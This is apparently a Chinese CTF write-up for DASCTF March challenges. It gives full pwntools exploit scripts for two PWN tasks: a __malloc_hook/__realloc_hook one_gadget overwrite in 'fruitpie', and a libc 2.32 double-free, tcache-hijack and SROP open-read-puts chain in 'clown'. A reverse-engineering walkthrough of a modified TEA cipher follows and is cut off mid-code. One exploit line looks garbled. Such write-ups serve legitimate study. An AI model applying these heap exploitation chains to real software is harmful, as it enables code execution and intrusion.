# MAR DASCTF明御攻防赛 PWN、RE Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
比赛最后拿到了第二名（密码👴带我飞），作为队伍中的PWN & RE选手，赛后复现了一下全部RE题目和两题PWN。
## PWN部分
###  fruitpie
程序代码非常简单，申请一个任意size的堆块，然后告诉你堆块的地址，并且让你在堆块附近写入10字节的。
**解题思路**
**1.MMAP申请堆块**
我们知道当我们malloc一个大的堆块（0x200000）时就会使用mmap来分配堆块，此时堆地址紧挨libc，我们可以根据输出的堆块地址，来计算出libc的基址。
**2.Offset向前溢出**
程序没有对我们输入的offset做检测，所以我们可以利用这个offset对堆块附近的地址来写入内容。
**3.打__malloc_hook**
由于题目提供了libc文件，并且在程序结束位置调用了malloc函数，所以我们可以直接打malloc_hook，但实际上发现所有的one_gadget都无法成功打通。因此题目也给了10字节的权限，为的就是让你通过
**malloc_hook附近的** realloc_hook来调整栈帧。
**4.__realloc_hook调整栈帧**
我们知道在realloc函数的开头存在着非常多的push指令，我们可以借助这些指令来调整栈帧，并且这些指令都不会影响到之后调用__realloc_hook
所以我们可以在 **realloc_hook的地址写入one_gadget的地址，在** malloc_hook的地址写入realloc +
x来调整栈帧，在这道题中x的取值可以有2, 4, 6, 8, 9。
PS：这道题直接用realloc符号找到的地址似乎不正确，要用__libc_realloc来定位地址。
**EXP**
    from pwn import *
    context.log_level = "debug"
    #r = process('./fruitpie')
    r = remote('54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com', 50102)
    def debug(addr = 0, PIE = True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
            print ("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(r, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(r, "b *{}".format(hex(addr)))
    r.sendlineafter("Enter the size to malloc:", str(0x100000))
    r.recvuntil('0x')
    mmap_addr = int(r.recvuntil('\n', drop=True), 16)
    libc_base = mmap_addr - 0x515010
    one = [0x4f365, 0x4f3c2, 0x10a45c]
    log.success("libc_base: " + hex(libc_base))
    realloc_hook_addr = libc_base + 0x3ebc28
    realloc_addr = libc_base + 0x98ca0
    offset = realloc_hook_addr - mmap_addr
    r.sendlineafter("Offset:", hex(offset))
    # gdb.attach(r, "b __libc_realloc")
    r.sendafter("Data:", p64(libc_base + one[2]) + p64(realloc_addr + 2))
    r.interactive()
###  clown
libc2.32菜单堆题，拥有add，show，delete三种操作，在add中可以edit堆块内容。
开了沙箱，需要用orw
###  程序分析
我们可以注意到在delete函数中存在，delete之后不清空的漏洞，我们可以利用这个来造成double free。
在show函数中，使用puts输出堆块内容
在add函数中，要求堆块大小小于0x100，且堆块个数小于0xFF
**解题思路**
**1.利用unsorted bin泄露libc**
先释放7个chunk把tcache填满，然后再释放一个chunk进入到unsorted bin（注意要有个堆块与top chunk隔开），由于在libc
2.32下 main_arena + 88的地址末尾是\x00，所以我们需要覆盖最低字节才可以用puts输出。（虽然必须要覆盖一个字节）
**2.利用libc2.32新特性泄露heap base**
简单的来说就是在next位置会有一个key与next原来的内容进行异或并保存，这个key的地址就是next的位置右移12位（去掉末尾12位），当tcache链为空的时候，就是0与key进行异或，在next的位置内容就是key，我们可以泄露这个key来得到堆基址。
关于这个特性的详细介绍可以看我的博客：[http://blog.wjhwjhn.com/archives/186/](http://blog.wjhwjhn.com/archives/186/?fileGuid=K66x6YWJ8jWCqQyC)
**3.通过fastbin来构造double free再利用**
但是在libc 2.32中对于tcache double
free的检测有些严格，并且这道题只有在add的时候才能修改堆块，所以我们考虑用fastbin来构造出double
free（a->b->a），再fastbin reverse into
tcache这个机制让fastbin进入到tcache中，并且覆盖next内容到tcache
struct（与key异或后的结果），让单次任意读写漏洞变成多次任意读写漏洞。
**4.劫持tcache struct的内容到__free_hook**
由于之后SROP的payload过长，所以还要分成两段来写。同时需要注意把对应申请堆块size的counts变成1，否则无法申请出来。
**5.使用gadget来将rdi参数转移到rdx**
在 libc2.29 及以后的版本，setcontext + 61 中调用的参数变成了 rdx，而不是 rdi，这使得我们在利用__free_hook
传参的时候，无法直接传到 setcontext 中，这里我们就要考虑找一个 gadget 来传参使得 rdi 的参数转变到 rdx 上。
    mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
可以使用这个gadget来转移参数，这个操作以及提及多次，这里不再复述，如果有疑问的可以看一下我之前发的文章。  
 **6.在free_hook旁边构造SROP**
这个纯属为了偷懒，让SROP和写__free_hook的操作放到一起去，这样就可以一次性搞定所有环节。不过最后因为size限制的问题还是分了两部来写。
注意：在libc2.32中新增了一个检测要求tcache申请的内容要与0x10对齐，否则会申请错误。
**EXP**
    from pwn import *
    context.log_level = "debug"
    r = process('./clown')
    #r = remote('pwn.machine.dasctf.com', 50501)
    libc = ELF('libc/libc.so.6')
    context.arch = "amd64"
    def choice(idx):
        r.sendafter(">> ", str(idx))
    def add(size, content = 'a'):
        choice(1)
        r.sendafter("Size: ", str(size))
        r.sendafter("Content: ", content)
    def delete(idx):
        choice(2)
        r.sendafter("Index: ", str(idx))
    def show(idx):
        choice(3)
        r.sendafter("Index: ", str(idx))
    #leak libc
    #fill tcache
    for i in range(7):
        add(0x100)
    add(0x100) #7
    add(0x100) #8
    for i in range(7):
        delete(i)
    delete(7) #into unsortedbin
    add(0x80) #9 partial overwrite
    show(7)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1b7d61
    log.success("libc_base: " + hex(libc_base))
    libc.address = libc_base
    add(0x78) #10
    #leak heap_base
    add(0x68) #11
    delete(11)
    show(11)
    heap_base = u64(r.recvuntil('\nDone', drop=True)[-5:].ljust(8, '\x00'))  tcache struct
    add(0x68, p64((heap_base + 0xF0) ^ (heap_base >> 12))) #28
    add(0x68) #29
    add(0x68) #30
    #counts0 -> 1
    add(0xF8) #31
    delete(31)
    add(0xE8) #32
    delete(32)
    #hijack tcache struct 
    add(0x68, p64(0) + p64(libc.sym['__free_hook'] + 0xF0) + p64(libc.sym['__free_hook'])) #33
    #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    gadget = libc_base + 0x0000000000124990
    pop_rdi_addr = libc_base + 0x00000000000277d6
    pop_rsi_addr = libc_base + 0x0000000000032032
    pop_rdx_addr = libc.address + 0x00000000000c800d
    fake_frame_addr = libc.sym['__free_hook'] + 0x10
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret
    rop_data = [
        libc.sym['open'],
        pop_rdx_addr,
        0x100,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        libc.sym['read'],
        pop_rdi_addr,
        fake_frame_addr + 0x200,
        libc.sym['puts']
    ]
    payload = p64(gadget) + p64(fake_frame_addr) + '\x00' * 0x20 + p64(libc.sym['setcontext'] + 53) + str(frame)[0x28:] + "flag\x00\x00\x00\x00" + p64(0) + str(flat(rop_data))
    add(0xF8, payload[:0xF0]) #34 write to __free_hook part1
    add(0xE8, payload[0xF0:]) #35 write to __free_hook part2
    delete(34)
    r.interactive()
## RE部分
###  drinkSomeTea
不太容易发现的魔改Tea
**去除花指令**
观察主函数，发现有个调用的函数无法正常识别，无法查看伪代码。
观察汇编后发现存在花指令，于是我们考虑手动去除。
可以看到我们代码中一定会跳转到地址是401117，但是IDA却被误导从401116开始汇编导致后续汇编出错。
我们可以在代码上按D键转换为数据。
然后手动在401117位置按C键转化为代码。
可以发现在401116位置多出了一个0xE8，我们可以用Patch工具修改为0x90（nop）指令
再到函数头部按P键识别为函数
**TEA encode函数**
之后就可以F5查看伪代码了
稍微进行一下重命名就可以发现这是个很标准的tea加密函数，那么你就掉进这个坑里了，仔细观察变量类型都是int，但是在常规的tea加密函数中应该是用unsigned
int来对数据进行处理，所以导致一般网上的tea解密脚本无法使用，需要手动修改类型为int，两者在符号运算的过程中存在一定区别导致程序无法正确的计算。
**主函数逻辑**
在main函数中的逻辑非常清晰，大概就是读入tea.png文件，然后每8字节进行一次加密，最后输出到tea.png.out文件中，对应的tea加密key就是那个fake
flag了，我们现在有了加密后的数据，只需要编写解密代码即可得到图片。
**解题代码**
    #include 
    #include 
    void encrypt(int* v, const unsigned int* k)
    {
        int v0 = v[0], v1 = v[1], sum = 0, i;
        int delta = 0x9E3779B9;
        int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
        for (i = 0; i > 5) + k1);
            v1 += ((v0 > 5) + k3);
        }
        v[0] = v0;
        v[1] = v1;
    }
    void decrypt(int* v, unsigned int* k)
    {